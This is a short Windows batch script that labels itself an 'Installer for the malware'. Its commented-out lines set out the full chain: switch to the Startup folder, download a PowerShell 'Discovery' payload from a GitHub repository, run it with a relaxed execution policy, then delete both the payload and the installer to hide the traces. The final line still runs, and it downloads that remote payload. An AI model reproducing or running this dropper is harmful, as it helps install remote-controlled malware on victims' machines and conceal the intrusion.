@REM @rem Installer for the malware

@REM @echo off
@REM set "CurrentDirectory=%CD%"
@REM set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM @REM Change directory to startup
@REM cd /d "%StartupDirectory%"

@REM @REM Download required files
@REM powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"

@REM @REM Run the PowerShell discovery
@REM powershell -ExecutionPolicy RemoteSigned -File "Discovery.ps1"

@REM @REM Delete the discovery file
@REM del "Discovery.ps1"

@REM @REM Delete the original installer
@REM cd /d %CurrentDirectory%
@REM del "Installer.cmd"

@REM Download required files
powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d1e7e2f8d26435e8781df7863bb169733e491b8b/Payload/DiscordPowershellDiscovery.ps1?raw=true' -OutFile 'Discovery.ps1'"
